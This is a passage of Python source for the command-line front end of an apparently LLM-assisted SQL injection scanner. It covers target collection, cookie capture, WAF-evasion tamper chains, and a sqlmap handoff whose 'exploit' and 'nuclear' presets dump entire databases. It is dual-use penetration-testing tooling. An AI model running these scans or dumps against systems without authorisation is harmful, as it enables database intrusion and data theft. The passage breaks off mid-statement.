"""
LLMSQL CLI — AI-powered SQL injection scanner.

Usage:
  python -m llmsql -u "http://target/page?id=1"
  python -m llmsql -u "http://target/api" --data '{"user":"admin"}' --header "Content-Type: application/json"
  python -m llmsql -u "http://target/login" --data "user=admin&pass=test" --method POST
"""

import argparse
import sys

from rich.console import Console

from llmsql import __version__
from llmsql.agent import LlmAgent
from llmsql.http_probe import HttpProbe
from llmsql.ollama import (
    DEFAULT_OLLAMA_MODEL,
    ensure_ready,
    ollama_base_url,
)
from llmsql.report import print_report, save_json
from llmsql.scanner import Scanner


def parse_headers(header_args: list[str]) -> dict[str, str]:
    headers = {}
    for h in header_args:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()
        elif "=" in h:
            k, v = h.split("=", 1)
            headers[k.strip()] = v.strip()
    return headers


def parse_cookies(cookie_str: str) -> dict[str, str]:
    cookies = {}
    for part in cookie_str.split(";"):
        part = part.strip()
        if "=" in part:
            k, v = part.split("=", 1)
            cookies[k.strip()] = v.strip()
    return cookies


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="llmsql",
        description="LLMSQL — AI-powered SQL injection scanner (sqlmap alternative)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u "http://testphp.vulnweb.com/artists.php?artist=1"
  %(prog)s -u "http://target/search" --data "q=test" --method POST
  %(prog)s -l urls.txt --only-with-params        # scan a URL list
  katana -u https://target -f qurl -silent | %(prog)s --stdin --only-with-params
  %(prog)s --openapi https://target/            # import Swagger/OpenAPI spec
  %(prog)s -u "http://target/api/count" --guess-params   # mine param names
  %(prog)s -u "http://target/page?id=1" --no-llm          # heuristic-only

Note: a bare host with no ?params has nothing to inject. Either import the
API spec (--openapi), mine param names (--guess-params), or crawl first
(katana/gau) to collect parameterized URLs and pipe them in.
        """,
    )

    # Target (sqlmap-style)
    p.add_argument("-u", "--url", help="Target URL")
    p.add_argument("-l", "--list", dest="url_list",
                   help="File with target URLs, one per line (e.g. katana output)")
    p.add_argument("--stdin", action="store_true",
                   help="Read target URLs from stdin (e.g. katana ... | llmsql --stdin)")
    p.add_argument("--only-with-params", action="store_true",
                   help="Skip URLs with no query params AND no path segments to test")
    p.add_argument("--path", dest="test_path", action="store_true",
                   help="Test URL path segments too (e.g. /api/products/1). Auto-on for crawl input")
    p.add_argument("--path-all", action="store_true",
                   help="Test every path segment, not just IDs/last segment")
    p.add_argument("--no-path", dest="no_path", action="store_true",
                   help="Disable path-segment testing even in crawl mode")
    p.add_argument("--guess-params", action="store_true",
                   help="Mine common param names (query,q,id,search,...) on each URL")
    p.add_argument("--param-wordlist",
                   help="File of parameter names to guess (implies --guess-params)")
    p.add_argument("--openapi",
                   help="Import an OpenAPI/Swagger spec (URL, file, or site root) "
                        "to discover endpoints WITH their real parameter names")
    p.add_argument("--data", help="POST data (form or JSON string)")
    p.add_argument("--method", default="GET", help="HTTP method (default: GET)")
    p.add_argument("-H", "--header", action="append", default=[], dest="headers",
                   help="Extra header (Name: Value or Name=Value)")
    p.add_argument("--cookie", help="Cookie string (name=value; name2=value2)")
    p.add_argument("--grab-cookie", nargs="?", const="__FIRST__", metavar="URL",
                   help="Fetch a URL (or the first target) and capture its Set-Cookie "
                        "session cookie, then reuse it for the scan and sqlmap handoff")
    p.add_argument("--login-url", help="POST credentials here to obtain a session cookie")
    p.add_argument("--login-data", help="Login POST body (form or JSON) for --login-url")
    p.add_argument("-p", "--param", action="append", dest="params",
                   help="Test only this parameter (repeatable)")
    p.add_argument("--proxy", help="HTTP proxy URL")
    p.add_argument("--timeout", type=float, default=15.0,
                   help="HTTP request timeout in seconds for LLMSQL's own requests (default: 15)")

    # Scan depth
    p.add_argument("--level", type=int, default=1, choices=[1, 2, 3],
                   help="Test depth: 1=quick, 2=normal, 3=deep (default: 1)")
    p.add_argument("--risk", type=int, default=1, choices=[1, 2, 3],
                   help="Risk: 1=safe payloads, 3=aggressive (default: 1)")
    p.add_argument("--max-attempts", type=int, default=None,
                   help="Max payloads per parameter (default: level-based)")

    # Performance
    p.add_argument("--threads", "-t", type=int, default=1,
                   help="Concurrent targets to scan (default: 1)")
    p.add_argument("--fast", action="store_true",
                   help="Skip per-param LLM payload suggestion; heuristics + LLM confirm only "
                        "(much faster with local models like llama3.2)")
    p.add_argument("--payloads", default="sqlmap",
                   choices=["sqlmap", "embedded", "error", "boolean", "union", "time", "stacked"],
                   help="Payload source: 'sqlmap' reads from sqlmap XML library, "
                        "'embedded' uses built-in set, or pick a technique (default: sqlmap)")
    p.add_argument("--sqlmap-data", metavar="DIR",
                   help="Path to sqlmap data/xml/payloads dir (auto-detected if not set)")
    p.add_argument("--sleep", type=int, default=3,
                   help="Sleep seconds for time-based payloads (default: 3)")
    p.add_argument("--continue-on-found", action="store_true",
                   help="Keep probing a parameter even after confirming SQLi "
                        "(finds additional injection types before handing to sqlmap)")
    p.add_argument("--probe", dest="probe_alive", action="store_true",
                   help="Pre-filter dead URLs with a liveness check (auto-on for crawl input)")
    p.add_argument("--no-probe", action="store_true",
                   help="Disable liveness pre-filter")
    p.add_argument("--probe-threads", type=int, default=20,
                   help="Concurrency for liveness probe (default: 20)")
    p.add_argument("--include-404", dest="include_dead", action="store_true",
                   help="Test endpoints even if baseline is 404/405/401/403 (dead/auth-gated)")

    # WAF evasion
    p.add_argument("--tamper",
                   help="Comma-separated tamper chain applied to every payload "
                        "(e.g. space2comment,randomcase,charencode)")
    p.add_argument("--no-auto-tamper", action="store_true",
                   help="Do not auto-try evasion payloads when a WAF/block is detected")
    p.add_argument("--list-tamper", action="store_true",
                   help="List available tamper techniques and exit")

    # sqlmap handoff — use LLMSQL for discovery, sqlmap for exploitation
    p.add_argument("--sqlmap", action="store_true",
                   help="Don't scan; discover injectable URLs and emit a sqlmap "
                        "target list + command (recon -> sqlmap handoff)")
    p.add_argument("--run-sqlmap", action="store_true",
                   help="Like --sqlmap, but also execute sqlmap if it is installed")
    p.add_argument("--sqlmap-out", default="llmsql-sqlmap-urls.txt",
                   help="File to write discovered sqlmap targets (default: llmsql-sqlmap-urls.txt)")
    p.add_argument("--sqlmap-profile", choices=["stealth", "normal", "aggressive", "exploit", "nuclear"],
                   default="normal",
                   help="sqlmap intensity preset (default: normal). "
                        "aggressive=level5/risk3; exploit=+auto-dump; nuclear=+all techniques/tampers")
    p.add_argument("--sqlmap-args", default="",
                   help="Extra sqlmap args appended to the profile (e.g. '--dbms=postgresql -p query')")
    p.add_argument("--sqlmap-menu", action="store_true",
                   help="Interactively choose the sqlmap profile and edit flags before running")
    p.add_argument("--then-sqlmap", action="store_true",
                   help="Scan with LLMSQL first, then run sqlmap ONLY on the confirmed "
                        "injectable URLs (fast + deep exploitation of real hits)")
    p.add_argument("--ask", action="store_true",
                   help="After Stage 1, show all findings and ask before launching sqlmap")
    p.add_argument("--sqlmap-timeout", type=int, default=0,
                   help="Max seconds per sqlmap target before it's killed and skipped "
                        "(0 = no limit). Prevents one endpoint from hanging the run")

    # LLM backend — Ollama is default
    p.add_argument("--ollama-host", default=None,
                   help="Ollama host (default: http://127.0.0.1:11434)")
    p.add_argument("--model", default=DEFAULT_OLLAMA_MODEL,
                   help=f"Ollama/LLM model (default: {DEFAULT_OLLAMA_MODEL})")
    p.add_argument("--no-start-ollama", action="store_true",
                   help="Do not auto-start Ollama; expect it already running")
    p.add_argument("--no-pull", action="store_true",
                   help="Do not auto-pull model if missing")
    p.add_argument("--api-key", help="Override API key (for non-Ollama backends)")
    p.add_argument("--base-url", help="Override LLM base URL (skips Ollama default)")
    p.add_argument("--no-llm", action="store_true",
                   help="Heuristic-only mode (no LLM, works offline)")

    # Output
    p.add_argument("-o", "--output", help="Save JSON report to file")
    p.add_argument("--batch", action="store_true", help="Non-interactive mode")
    p.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    p.add_argument("--show-response", action="store_true",
                   help="Print a snippet of each injected response (debug detection)")
    p.add_argument("--version", action="version", version=f"llmsql {__version__}")

    return p


def level_to_attempts(level: int) -> int:
    return {1: 5, 2: 8, 3: 15}[level]


def collect_targets(args) -> list[str]:
    """Gather target URLs from -u, -l file, and/or stdin."""
    targets: list[str] = []
    if args.url:
        targets.append(args.url.strip())

    if args.url_list:
        try:
            with open(args.url_list) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        targets.append(line)
        except OSError as e:
            raise SystemExit(f"Cannot read --list file: {e}")

    if args.stdin or (not sys.stdin.isatty() and not args.url and not args.url_list):
        for line in sys.stdin:
            line = line.strip()
            if line and not line.startswith("#"):
                targets.append(line)

    # De-duplicate while preserving order
    seen = set()
    unique = []
    for t in targets:
        if t not in seen:
            seen.add(t)
            unique.append(t)
    return unique


def probe_alive(
    urls: list[str],
    threads: int = 20,
    timeout: float = 8.0,
    headers: dict[str, str] | None = None,
    verify_ssl: bool = True,
    proxy: str | None = None,
) -> tuple[list[str], dict[str, int]]:
    """
    httpx-style liveness check. Returns (alive_urls, status_map).
    A URL is 'alive' if it responds at all with a non-dead status.
    """
    import concurrent.futures

    import httpx

    dead_statuses = {0, 404, 405, 410, 501}
    status_map: dict[str, int] = {}

    client_kwargs = {"timeout": timeout, "verify": verify_ssl, "follow_redirects": True}
    if proxy:
        client_kwargs["proxy"] = proxy

    def check(url: str) -> tuple[str, int]:
        try:
            with httpx.Client(**client_kwargs) as c:
                # Prefer GET (HEAD is often unsupported / misleading on APIs)
                resp = c.get(url, headers=headers or {})
                return url, resp.status_code
        except (httpx.HTTPError, OSError):
            return url, 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=max(1, threads)) as ex:
        for url, status in ex.map(check, urls):
            status_map[url] = status

    alive = [u for u in urls if status_map.get(u, 0) not in dead_statuses]
    return alive, status_map


# sqlmap intensity presets. Each is a full base flag string.
SQLMAP_PROFILES = {
    # cautious: low level/risk, delay, safe techniques
    "stealth": "--batch --random-agent --level 1 --risk 1 --delay 1 --time-sec 2 --technique=BEU",
    # balanced default
    "normal": "--batch --random-agent --level 3 --risk 2 --threads 4",
    # loud: max level/risk, more threads
    "aggressive": "--batch --random-agent --level 5 --risk 3 --threads 10",
    # aggressive + automatic exploitation (enumerate + dump everything)
    "exploit": (
        "--batch --random-agent --level 5 --risk 3 --threads 10 "
        "--dbs --tables --dump-all --exclude-sysdbs"
    ),
    # everything on: all techniques, tamper suite, full retrieval, banner/users/etc.
    "nuclear": (
        "--batch --random-agent --level 5 --risk 3 --threads 10 "
        "--technique=BEUSTQ -a --dump-all --exclude-sysdbs "
        "--tamper=space2comment,between,randomcase,charencode"
    ),
}


def interactive_sqlmap(console, profile: str, base_args: str, extra: str) -> str:
    """Let the user pick a profile and edit the final flag string."""
    console.print("\n[bold]sqlmap intensity profile:[/bold]")
    names = list(SQLMAP_PROFILES.keys())
    for i, name in enumerate(names, 1):
        marker = " [dim](current)[/dim]" if name == profile else ""
        console.print(f"  {i}) {name}{marker}")
    try:
        choice = input(f"Choose profile [{names.index(profile) + 1}]: ").strip()
    except EOFError:
        choice = ""
    if choice.isdigit() and 1 <= int(choice) <= len(names):
        profile = names[int(choice) - 1]
        base_args = SQLMAP_PROFILES[profile]

    composed = f"{base_args} {extra}".strip()
    console.print(f"\n[bold]Flags:[/bold] {composed}")
    console.print("[dim]Press Enter to accept, or type a full replacement flag string:[/dim]")
    try:
        edited = input("> ").strip()
    except EOFError:
        edited = ""
    return edited or composed


def launch_sqlmap(cmd: str, timeout: int, console) -> int:
    """
    Run a sqlmap command.

    - timeout == 0: interactive mode — parent ignores SIGINT so Ctrl+C reaches
      sqlmap's own [C]ontinue/[Q]uit menu.
    - timeout > 0: automated mode — sqlmap runs in its own process group and is
      killed (with its children) if it exceeds the timeout.
    """
    import os
    import signal
    import subprocess

    if timeout and timeout > 0:
        proc = subprocess.Popen(cmd, shell=True, start_new_session=True)
        try:
            return proc.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            console.print(
                f"[yellow]sqlmap exceeded {timeout}s — killing and moving on[/yellow]"
            )
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except ProcessLookupError:
                pass
            return 124  # conventional timeout exit code
        except KeyboardInterrupt:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except ProcessLookupError:
                pass
            raise

    # Interactive: hand Ctrl+C to sqlmap's own menu
    prev = signal.signal(signal.SIGINT, signal.SIG_IGN)
    try:
        return subprocess.run(cmd, shell=True).returncode
    finally:
        signal.signal(signal.SIGINT, prev)


def grab_cookie(
    url: str,
    headers: dict[str, str] | None = None,
    login_url: str | None = None,
    login_data: str | None = None,
    verify_ssl: bool = True,
    proxy: str | None = None,
) -> tuple[str, dict[str, str]]:
    """
    Obtain session cookies from a target.

    If login_url/login_data are given, POST them first (form or JSON). Then
    read the cookie jar. Returns (cookie_string, cookie_dict).
    """
    import httpx

    kwargs = {"timeout": 15.0, "verify": verify_ssl, "follow_redirects": True}
    if proxy:
        kwargs["proxy"] = proxy
    jar: dict[str, str] = {}
    with httpx.Client(**kwargs) as c:
        try:
            if login_url and login_data:
                is_json = login_data.strip().startswith("{")
                if is_json:
                    import json as _json
                    c.post(login_url, json=_json.loads(login_data), headers=headers or {})
                else:
                    from urllib.parse import parse_qsl
                    c.post(login_url, data=dict(parse_qsl(login_data)), headers=headers or {})
            else:
                c.get(url, headers=headers or {})
        except httpx.HTTPError:
            pass
        for cookie in c.cookies.jar:
            jar[cookie.name] = cookie.value

    cookie_str = "; ".join(f"{k}={v}" for k, v in jar.items())
    return cookie_str, jar


def sqlmap_handoff(
    targets: list[str],
    guess_params: list[str] | None,
    out_file: str,
    profile: str,
    sqlmap_args: str,
    run: bool,
    headers: dict[str, str],
    cookie: str | None,
    console,
    verbose: bool = False,
    menu: bool = False,
    timeout: int = 0,
) -> int:
    """Emit a sqlmap target list + command; optionally run sqlmap."""
    from urllib.parse import urlparse

    # Expand: keep URLs that already have params; for bare URLs, if param
    # mining is on, append a few high-value candidate params so sqlmap has
    # something to test.
    mine = (guess_params or [])[:6]
    urls: list[str] = []
    seen: set[str] = set()
    for t in targets:
        parsed_t = urlparse(t)
        has_q = bool(parsed_t.query)
        if has_q:
            # URL already has real params from OpenAPI/crawl — use as-is
            candidates = [t]
        elif mine:
            # Bare URL — expand with top mined param names for discovery
            candidates = [f"{t}?{p}=1" for p in mine]
        else:
            candidates = [t]
        for c in candidates:
            if c not in seen:
                seen.add(c)
                urls.append(c)

    if not urls:
        console.print("[yellow]No parameterized URLs to hand to sqlmap.[/yellow]")
        return 2

    with open(out_file, "w") as f:
        f.write("\n".join(urls) + "\n")

    # Compose flags: profile base + user extras, optionally via interactive menu
    base_args = SQLMAP_PROFILES.get(profile, SQLMAP_PROFILES["normal"])
    if menu:
        final_flags = interactive_sqlmap(console, profile, base_args, sqlmap_args)
    else:
        final_flags = f"{base_args} {sqlmap_args}".strip()

    header_args = ""
    for k, v in (headers or {}).items():
        if k.lower() != "user-agent":
            header_args += f" -H '{k}: {v}'"
    if cookie:
        header_args += f" --cookie '{cookie}'"

    cmd = f"sqlmap -m {out_file} {final_flags}{header_args}"

    console.print(f"[green]✓[/green] Wrote {len(urls)} sqlmap targets to [bold]{out_file}[/bold]")
    # Always show what will be tested (this is the "did it cover my URLs?" answer)
    show = urls if (verbose or len(urls) <= 40) else urls[:40]
    for u in show:
        console.print(f"    [cyan]->[/cyan] {u}")
    if len(show) < len(urls):
        console.print(f"    [dim]... and {len(urls) - len(show)} more (see {out_file})[/dim]")
    console.print(
        f"\n[dim]sqlmap will test each URL's parameters sequentially "
        f"(~100+ techniques per param).[/dim]"
    )
    console.print(f"\n[bold]Run sqlmap[/bold] [dim](profile: {profile})[/dim]:")
    console.print(f"  {cmd}\n")
    console.print(
        "[dim]Tip: for per-parameter focus add -p <name>; "
        "for the BrokenCrystals raw-SQL bug, sqlmap error-based will flag "
        "/api/testimonials/count?query=...[/dim]"
    )

    if run:
        import shutil
        if not shutil.which("sqlmap"):
            console.print("[yellow]sqlmap not found on PATH; command printed above.[/yellow]")
            return 1
        hint = f" [dim](timeout {timeout}s)[/dim]" if timeout else \
            " [dim](Ctrl+C hands the menu to sqlmap)[/dim]"
        console.print(f"[cyan]Launching sqlmap...[/cyan]{hint}\n")
        return launch_sqlmap(cmd, timeout, console)
    return 0


def has_injectable_params(url: str, test_path: bool = False) -> bool:
    """Does the URL carry query params (or path segments when path testing)?"""
    from urllib.parse import urlparse
    parsed = urlparse(url)
    if parsed.query or "*" in url:
        return True
    if test_path:
        return any(s for s in parsed.path.split("/") if s)
    return False


def setup_llm_backend(args, console: Console) -> tuple[bool, str | None, str | None]:
    """
    Prepare LLM backend. Returns (use_llm, base_url, error_message).
    """
    if args.no_llm:
        return False, None, None

    # Explicit remote backend (OpenAI, LiteLLM, etc.)
    if args.base_url:
        import os
        if not args.api_key and not os.getenv("OPENAI_API_KEY"):
            return False, None, (
                "Remote LLM backend requires --api-key or OPENAI_API_KEY. "
                "Omit --base-url to use local Ollama."
            )
        return True, args.base_url.rstrip("/"), None

    # Default: local Ollama background
    host = args.ollama_host
    status = console.print if args.verbose else lambda m: console.print(f"[dim]{m}[/dim]")

    ok, msg = ensure_ready(
        model=args.model,
        host=host,
        auto_start=not args.no_start_ollama,
        auto_pull=not args.no_pull,
        on_status=status,
    )
    if not ok:
        return False, None, msg

    if not args.verbose:
        console.print(f"[green]✓[/green] {msg}")
    return True, ollama_base_url(host), None


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    console = Console()

    if args.list_tamper:
        from llmsql.tamper import available
        console.print("[bold]Available tamper techniques:[/bold]")
        for name in available():
            console.print(f"  {name}")
        return 0

    console.print(
        f"[bold cyan]LLMSQL v{__version__}[/bold cyan] — "
        f"AI-powered SQL injection scanner [dim](Ollama backend)[/dim]\n"
    )

    targets = collect_targets(args)

    # OpenAPI/Swagger import — discover endpoints with their real param names
    # spec_extras maps url -> (method, body, content_type, inject_headers)
    spec_extras: dict[str, tuple[str, Optional[str], Optional[str], Optional[dict]]] = {}
    if args.openapi:
        from llmsql.openapi import load_openapi
        console.print(f"[*] Importing OpenAPI spec from {args.openapi} ...")
        try:
            spec_targets = load_openapi(
                args.openapi,
                headers={
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"
                },
            )
            if spec_targets:
                console.print(
                    f"[green]✓[/green] {len(spec_targets)} endpoints from spec "
                    f"[dim]({sum(1 for t in spec_targets if t.method != 'GET')} POST/PUT)[/dim]"
                )
                for st in spec_targets:
                    targets.append(st.url)
                    if st.method != "GET" or st.body or st.inject_headers:
                        spec_extras[st.url] = (
                            st.method, st.body, st.content_type, st.inject_headers
                        )
            else:
                console.print("[yellow]No endpoints parsed from spec[/yellow]")
        except Exception as e:
            console.print(f"[yellow]OpenAPI import failed: {e}[/yellow]")
        # De-dup after merge
        seen_t: set[str] = set()
        targets = [t for t in targets if not (t in seen_t or seen_t.add(t))]

    if not targets:
        console.print(
            "[red]No targets.[/red] Provide one of:\n"
            "  -u \"http://host/page?id=1\"\n"
            "  -l urls.txt            (file of URLs)\n"
            "  --stdin                (pipe URLs in)\n\n"
            "[dim]Tip: a bare host with no parameters has nothing to inject. "
            "Crawl first, e.g.:[/dim]\n"
            "  [dim]katana -u https://target -f qurl -silent | "
            "python -m llmsql --stdin --only-with-params[/dim]"
        )
        return 2

    # Crawl mode = many targets from stdin/list. Path testing on by default there
    # (REST apps are mostly path-based), unless explicitly disabled.
    crawl_mode = bool(args.stdin or args.url_list) or len(targets) > 1
    test_path = args.test_path or (crawl_mode and not args.no_path)
    if args.no_path:
        test_path = False

    # For crawl input, it's common to only care about parameterized URLs
    if args.only_with_params:
        before = len(targets)
        targets = [t for t in targets if has_injectable_params(t, test_path)]
        skipped = before - len(targets)
        if skipped:
            console.print(f"[dim]Skipped {skipped} URL(s) without query parameters[/dim]")
        if not targets:
            console.print("[yellow]No URLs with parameters to test.[/yellow]")
            return 2

    headers = parse_headers(args.headers)
    cookies = parse_cookies(args.cookie) if args.cookie else {}
    content_type = headers.get("Content-Type") or headers.get("content-type")
    # max_attempts must be >= len(seed_payloads) so all payloads get tested.
    # We resolve this after loading payloads below.
    _raw_max_attempts = args.max_attempts

    # Auto-grab a session cookie (optionally via login) and reuse everywhere
    if args.grab_cookie or (args.login_url and args.login_data):
        seed_url = args.grab_cookie
        if not seed_url or seed_url == "__FIRST__":
            seed_url = targets[0]
        console.print("[*] Grabbing session cookie...")
        cookie_str, jar = grab_cookie(
            seed_url,
            headers=headers,
            login_url=args.login_url,
            login_data=args.login_data,
            proxy=args.proxy,
        )
        if jar:
            cookies.update(jar)
            if not args.cookie:
                args.cookie = cookie_str
            else:
                args.cookie = args.cookie.rstrip("; ") + "; " + cookie_str
            console.print(f"[green]✓[/green] Captured cookie(s): {', '.join(jar.keys())}")
        else:
            console.print("[yellow]No Set-Cookie returned by the target[/yellow]")

    # Parameter mining wordlist
    guess_params = None
    if args.guess_params or args.param_wordlist:
        from llmsql.payloads import COMMON_PARAMS
        if args.param_wordlist:
            try:
                with open(args.param_wordlist) as f:
                    guess_params = [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
            except OSError as e:
                console.print(f"[yellow]Cannot read --param-wordlist: {e}[/yellow]")
                guess_params = list(COMMON_PARAMS)
        else:
            guess_params = list(COMMON_PARAMS)

    default_ua = (
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120 Safari/537.36"
    )
    # UA used for liveness probing; NOT an injection point unless user set -H
    probe_headers = dict(headers)
    probe_headers.setdefault("User-Agent", default_ua)

    # Liveness pre-filter (httpx-style): drop dead URLs before the slow work.
    # Runs before both the scan AND the sqlmap handoff so sqlmap isn't fed
    # dead endpoints. On by default for crawl/spec input; disable with --no-probe.
    do_probe = (args.probe_alive or crawl_mode) and not args.no_probe and len(targets) > 1
    if do_probe:
        console.print(f"[*] Probing {len(targets)} URLs for liveness (httpx-style)...")
        alive, status_map = probe_alive(
            targets,
            threads=args.probe_threads,
            timeout=min(args.timeout, 8.0),
            headers=probe_headers,
            proxy=args.proxy,
        )
        dead = len(targets) - len(alive)
        console.print(
            f"[*] Live: [green]{len(alive)}[/green]  "
            f"Dead/filtered: [dim]{dead}[/dim]"
        )
        if args.verbose:
            for u in alive:
                console.print(f"    [green]live[/green] {u} ({status_map.get(u)})")
        targets = alive
        if not targets:
            console.print("[yellow]No live targets.[/yellow]")
            return 2

    # sqlmap handoff: use LLMSQL only for discovery, then hand to sqlmap
    if args.sqlmap or args.run_sqlmap:
        return sqlmap_handoff(
            targets=targets,
            guess_params=guess_params,
            out_file=args.sqlmap_out,
            profile=args.sqlmap_profile,
            sqlmap_args=args.sqlmap_args,
            run=args.run_sqlmap,
            headers=headers,
            cookie=args.cookie,
            console=console,
            verbose=args.verbose,
            menu=args.sqlmap_menu,
            timeout=args.sqlmap_timeout,
        )

    # Load payload library
    from llmsql.sqlmap_payloads import get_payloads, load_sqlmap_payloads
    if args.payloads in ("sqlmap", "embedded"):
        seed_payloads, payload_src = load_sqlmap_payloads(
            data_dir=getattr(args, "sqlmap_data", None),
            sleep=args.sleep,
        )
    else:
        seed_payloads = get_payloads(techniques=[args.payloads], sleep=args.sleep)
        payload_src = f"{args.payloads} technique ({len(seed_payloads)} payloads)"

    # --fast: only error-based payloads (fastest detection, no time-blind)
    if args.fast:
        from llmsql.sqlmap_payloads import PAYLOADS_ERROR_BASED
        display_payloads = PAYLOADS_ERROR_BASED
        payload_src = f"error-based only [{len(display_payloads)} payloads, fast mode]"
    else:
        display_payloads = seed_payloads

    # max_attempts must cover the whole payload list so nothing is skipped
    if _raw_max_attempts:
        max_attempts = _raw_max_attempts
    else:
        max_attempts = len(display_payloads)

    console.print(f"[dim]Payloads: {payload_src} | max {max_attempts}/param[/dim]")

    tamper_chain = []
    if args.tamper:
        from llmsql.tamper import TAMPERS
        for name in args.tamper.split(","):
            name = name.strip()
            if name and name in TAMPERS:
                tamper_chain.append(name)
            elif name:
                console.print(f"[yellow]Unknown tamper '{name}' (see --list-tamper)[/yellow]")

    if len(targets) > 1:
        console.print(f"[*] {len(targets)} targets queued\n")

    use_llm, base_url, llm_error = setup_llm_backend(args, console)
    if llm_error:
        console.print(f"[yellow]{llm_error}[/yellow]")
        console.print("[yellow]Falling back to heuristic-only mode.[/yellow]\n")
        use_llm = False

    probe = HttpProbe(
        timeout=args.timeout,
        proxy=args.proxy,
        default_headers={"User-Agent": default_ua},
        cookies=cookies,
    )

    agent = LlmAgent(
        api_key=args.api_key,
        base_url=base_url,
        model=args.model if use_llm else DEFAULT_OLLAMA_MODEL,
    )

    verbose_progress = args.verbose or args.show_response

    def progress(msg: str):
        if verbose_progress or msg.startswith(("[!]", "[+]", "[*]\n", "[*] Scan")):
            console.print(msg)

    scanner = Scanner(
        agent=agent,
        probe=probe,
        max_attempts_per_param=max_attempts,
        use_llm=use_llm,
        test_path=test_path,
        path_all_segments=args.path_all,
        include_dead=args.include_dead,
        fast=args.fast,
        guess_params=guess_params,
        tamper=tamper_chain,
        auto_tamper=not args.no_auto_tamper,
        show_response=args.show_response,
        continue_on_found=args.continue_on_found,
        seed_payloads=display_payloads,
        on_progress=progress if verbose_progress else lambda m: (
            console.print(m) if m.lstrip().startswith(("[!]", "[*] Scan", "[*] Found")) else None
        ),
    )
    scanner._sleep_ms = args.sleep * 1000
    if tamper_chain:
        console.print(f"[dim]Tamper chain: {', '.join(tamper_chain)}[/dim]")
    if test_path:
        console.print("[dim]Path-segment injection: enabled[/dim]")
    if guess_params:
        console.print(f"[dim]Parameter mining: {len(guess_params)} names per URL[/dim]")

    all_reports = []
    total_findings = 0
    try:
        def run_one(target: str):
            # Use method/body/headers from OpenAPI spec if available, else CLI args
            spec_data = spec_extras.get(target, (None, None, None, None))
            spec_method, spec_body, spec_ct, spec_headers = spec_data
            # Merge: CLI headers take precedence; spec inject_headers are added
            merged_headers = dict(headers)
            if spec_headers:
                for k, v in spec_headers.items():
                    if k not in merged_headers:
                        merged_headers[k] = v
            return scanner.scan(
                url=target,
                method=spec_method or args.method,
                data=spec_body or args.data,
                content_type=spec_ct or content_type,
                extra_headers=merged_headers if merged_headers else headers,
                params=args.params,
            )

        if args.threads > 1 and len(targets) > 1:
            import concurrent.futures
            console.print(
                f"[dim]Scanning {len(targets)} targets with {args.threads} threads...[/dim]\n"
            )
            with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as ex:
                futures = {ex.submit(run_one, t): t for t in targets}
                done = 0
                for fut in concurrent.futures.as_completed(futures):
                    done += 1
                    report = fut.result()
                    all_reports.append(report)
                    total_findings += len(report.findings)
                    console.print(
                        f"\n[bold]── ({done}/{len(targets)}):[/bold] {report.target_url}"
                    )
                    print_report(report, console)
        else:
            for idx, target in enumerate(targets, 1):
                if len(targets) > 1:
                    console.print(f"\n[bold]── Target {idx}/{len(targets)}:[/bold] {target}")
                report = run_one(target)
                all_reports.append(report)
                total_findings += len(report.findings)
                print_report(report, console)
    finally:
        probe.close()
        agent.close()

    console.print(
        f"\n[bold green]━━━ Stage 1 complete[/bold green] — "
        f"{len(targets)} URL(s) scanned, "
        f"[bold]{total_findings}[/bold] finding(s)"
    )
    if total_findings:
        from rich.table import Table
        from urllib.parse import urlparse as _up
        tbl = Table(title="Confirmed SQLi Findings", show_lines=False)
        tbl.add_column("URL", no_wrap=False, max_width=70)
        tbl.add_column("Param", style="bold yellow")
        tbl.add_column("Type", style="cyan")
        tbl.add_column("DB", style="green")
        tbl.add_column("Conf")
        # Deduplicate: same base path + param = same sink
        seen_sinks: set[tuple[str, str]] = set()
        deduped = 0
        for r in all_reports:
            for f in r.findings:
                sink = (_up(r.target_url).path, f.param)
                if sink in seen_sinks:
                    deduped += 1
                    continue
                seen_sinks.add(sink)
                tbl.add_row(
                    r.target_url,
                    f.param,
                    f.injection_type.value,
                    f.db_type or "?",
                    f"{f.confidence:.0%}",
                )
        console.print(tbl)
        if deduped:
            console.print(
                f"[dim]({deduped} duplicate finding(s) collapsed — same endpoint+param)[/dim]"
            )

    if args.output:
        if len(all_reports) == 1:
            save_json(all_reports[0], args.output)
        else:
            _save_multi(all_reports, args.output)
        console.print(f"[dim]LLMSQL report saved to {args.output}[/dim]")

    # Stage 2: sqlmap on confirmed findings ONLY — starts after ALL URLs scanned
    if args.then_sqlmap:
        if total_findings == 0:
            console.print(
                "[yellow]No confirmed SQLi found — nothing to hand to sqlmap.[/yellow]"
            )
        else:
            if args.ask or args.sqlmap_menu:
                console.print(
                    f"\n[bold]Run sqlmap on {total_findings} confirmed finding(s)?[/bold] "
                    f"[dim](profile: {args.sqlmap_profile})[/dim]"
                )
                try:
                    answer = input("  [Y/n]: ").strip().lower()
                except EOFError:
                    answer = "y"
                if answer not in ("", "y", "yes"):
                    console.print("[dim]Skipped sqlmap — printing commands to run manually:[/dim]")
                    # Build and print the commands without executing
                    from llmsql.models import ParamLocation
                    from urllib.parse import urlparse as _up2, parse_qs, urlencode, urlunparse
                    base_args = SQLMAP_PROFILES.get(args.sqlmap_profile, SQLMAP_PROFILES["normal"])
                    header_args = "".join(
                        f" -H '{k}: {v}'" for k, v in headers.items()
                        if k.lower() != "user-agent"
                    )
                    if args.cookie:
                        header_args += f" --cookie '{args.cookie}'"
                    for r in all_reports:
                        for f in r.findings:
                            url = r.target_url
                            extra = f"-p {f.param}" if f.location in (
